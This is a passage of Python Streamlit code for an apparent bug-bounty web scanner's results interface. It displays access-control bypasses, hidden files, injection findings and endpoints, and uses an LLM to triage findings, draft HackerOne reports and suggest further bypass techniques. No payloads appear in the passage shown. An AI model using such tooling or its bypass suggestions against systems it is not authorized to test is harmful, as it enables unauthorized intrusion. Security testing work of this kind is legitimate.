                successes = result["successful_bypasses"]
                icon = "✅" if successes else "❌"
                with st.expander(f"{icon} {path} — {len(successes)}/{result['attempts']} succeeded (baseline: {result['baseline_status']})"):
                    if not successes:
                        st.caption("No bypass worked on this path.")
                    for s in successes:
                        st.success(f"**{s['kind']}** → {s['technique']} ({s['method']})")
                        st.markdown(f'<div class="mono-block">{s["url"]}</div>', unsafe_allow_html=True)
                        if s.get("headers"):
                            st.code(json.dumps(s["headers"], indent=2), language="json")
                        st.markdown(f"**Status:** {s['status']} | **Size:** {s['size']}")
                        for e in s.get("evidence", []):
                            st.markdown(f"- {e}")
        idx += 1

    if enable_hidden_files:
        with tabs[idx]:
            st.subheader("📁 Hidden Files")
            if not hf:
                st.info("Nothing interesting found.")
            for item in sorted(hf, key=lambda x: (x["status"] != 200, x["path"])):
                badge = "badge-vuln" if item["status"] == 200 else ("badge-bypass" if item["status"] in (401, 403) else "badge-safe")
                with st.expander(f"{'🔥' if item['status']==200 else '🔒'} {item['path']} [{item['status']}]"):
                    st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
                    st.markdown(f"**Size:** {item['size']} bytes")
                    for e in item.get("evidence", []):
                        st.markdown(f"- {e}")
        idx += 1

    if enable_injection:
        with tabs[idx]:
            st.subheader("💉 Parameter Injection")
            if not inj:
                st.success("No injection vectors confirmed.")
            for item in inj:
                with st.expander(f"⚠️ {item['category'].upper()} — `{item['payload']}`"):
                    st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
                    for e in item.get("evidence", []):
                        st.markdown(f"- {e}")
        idx += 1

    if enable_endpoints:
        with tabs[idx]:
            st.subheader("🔗 Endpoints")
            if not ep:
                st.info("No accessible endpoints discovered.")
            for item in sorted(ep, key=lambda x: x["status"]):
                with st.expander(f"🔗 {item['endpoint']} [{item['status']}]"):
                    st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
                    for e in item.get("evidence", []):
                        st.markdown(f"- {e}")
        idx += 1

    # ── AI Analysis tab ────────────────────────────────────────────────────
    if ai_enabled:
        with tabs[idx]:
            st.subheader("🧠 AI Analysis")

            if not ai_api_key:
                st.warning("Enter your OpenRouter API key in the sidebar to use AI features.")
            else:
                analyzer = AIAnalyzer(api_key=ai_api_key, model=ai_model)
                st.caption(f"Model: `{ai_model}`")

                # Build the scan report for context
                current_report = {
                    "target": target_url,
                    "summary": {
                        "disallowed_paths": disallowed_count,
                        "bypassed_paths": bypassed_count,
                        "critical_findings": critical_count,
                        "hidden_files_200": hidden_count,
                        "injections": len(inj),
                        "endpoints": len(ep),
                    },
                    "robots_bypass": rr,
                    "hidden_files": hf,
                    "injections": inj,
                    "endpoints": ep,
                }

                # ─── Triage ────────────────────────────────────────────
                st.markdown("### 1. Triage & Prioritization")
                col_t1, col_t2 = st.columns([1, 3])
                with col_t1:
                    if st.button("🔥 Run Triage", use_container_width=True):
                        with st.spinner("Analyzing findings..."):
                            ok, result = analyzer.triage(current_report)
                            if ok:
                                st.session_state["ai_triage"] = result
                            else:
                                st.error(f"AI error: {result}")
                                st.session_state["ai_triage"] = ""
                with col_t2:
                    st.caption("Ranks findings by real-world impact, flags false positives, suggests follow-ups.")

                if st.session_state.get("ai_triage"):
                    st.markdown(st.session_state["ai_triage"])
                    st.download_button(
                        "📥 Save triage",
                        data=st.session_state["ai_triage"],
                        file_name=f"triage_{int(time.time())}.md",
                        mime="text/markdown",
                    )

                st.divider()

                # ─── H1 Report Generator ─────────────────────────────
                st.markdown("### 2. HackerOne Report Generator")

                # Build list of writable findings
                writable = []
                for f in rr.get("critical_findings", []):
                    writable.append(("Robots bypass (critical)", f))
                for item in hf:
                    if item["status"] == 200 and item.get("evidence"):
                        writable.append((f"Hidden file: {item['path']}", item))
                for item in inj:
                    writable.append((f"{item['category'].upper()}: {item['payload'][:40]}", item))

                if not writable:
                    st.info("No critical findings to write up yet.")
                else:
                    choice_labels = [w[0] for w in writable]
                    selected = st.selectbox("Pick a finding to write up", choice_labels)
                    selected_data = writable[choice_labels.index(selected)][1]

                    if st.button("📝 Generate H1 Report", use_container_width=False):
                        with st.spinner("Writing report..."):
                            ok, result = analyzer.write_h1_report(selected_data, target_url)
                            if ok:
                                st.session_state["ai_reports"][selected] = result
                            else:
                                st.error(f"AI error: {result}")

                    if selected in st.session_state.get("ai_reports", {}):
                        report_md = st.session_state["ai_reports"][selected]
                        st.markdown(report_md)
                        st.download_button(
                            "📥 Save report",
                            data=report_md,
                            file_name=f"h1_report_{int(time.time())}.md",
                            mime="text/markdown",
                            key=f"dl_{selected}",
                        )

                st.divider()

                # ─── Bypass Suggester ─────────────────────────────────
                st.markdown("### 3. Advanced Bypass Suggester")
                st.caption("For paths where no technique worked — AI suggests techniques not yet tried.")

                stubborn = [
                    r for r in rr.get("bypass_results", [])
                    if not r.get("successful_bypasses") and r.get("baseline_status") in (401, 403, 404)
                ]
                if not stubborn:
                    st.info("No stubborn paths — everything was either bypassed or not protected.")
                else:
                    stubborn_paths = [r["path"] for r in stubborn]
                    picked = st.selectbox("Path that resisted all bypasses", stubborn_paths)
                    picked_result = next(r for r in stubborn if r["path"] == picked)
                    tried_techniques = [
                        b["technique"] for b in picked_result.get("bypasses", [])
                    ] or ["path_mutations", "header_bypasses", "method_bypasses"]

                    if st.button("💡 Suggest new techniques", use_container_width=False):
                        with st.spinner("Consulting AI..."):
                            ok, result = analyzer.suggest_bypasses(
                                picked,
                                picked_result["baseline_status"],
                                tried_techniques,
                            )
                            if ok:
                                st.session_state["ai_bypass_suggestions"][picked] = result
                            else:
                                st.error(f"AI error: {result}")

                    if picked in st.session_state.get("ai_bypass_suggestions", {}):
                        st.markdown(st.session_state["ai_bypass_suggestions"][picked])
        idx += 1

    with tabs[-1]:
        st.subheader("📄 JSON Report")
        report = {
            "target": target_url,
            "scan_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "scanner": "Zwanski Security Scanner v2",
            "summary": {
                "disallowed_paths": disallowed_count,
                "bypassed_paths": bypassed_count,
                "critical_findings": critical_count,
                "hidden_files_total": len(hf),
                "hidden_files_200": hidden_count,
                "injections": len(inj),
                "endpoints": len(ep),
            },
            "robots_bypass": rr,
            "hidden_files": hf,
            "injections": inj,
            "endpoints": ep,
            "ai": {
                "enabled": ai_enabled,
                "model": ai_model if ai_enabled else None,
                "triage": st.session_state.get("ai_triage", ""),
                "h1_reports": st.session_state.get("ai_reports", {}),
                "bypass_suggestions": st.session_state.get("ai_bypass_suggestions", {}),
            },
        }
        st.download_button(
            "📥 Download JSON Report",
            data=json.dumps(report, indent=2),
            file_name=f"zwanski_scan_{int(time.time())}.json",
            mime="application/json",
        )
        st.json(report, expanded=False)
else:
    st.markdown("""
    <div style="text-align:center;padding:60px 0;color:#8b949e;">
        <div style="font-size:3rem">🛡️</div>
        <p style="font-family:'Syne',sans-serif;font-size:1.2rem;margin-top:16px">
            Enter a target, pick modules, run the scan.
        </p>
        <p style="font-size:.85rem;margin-top:8px">
            Lab targets: testphp.vulnweb.com · demo.testfire.net
        </p>
    </div>
    """, unsafe_allow_html=True)
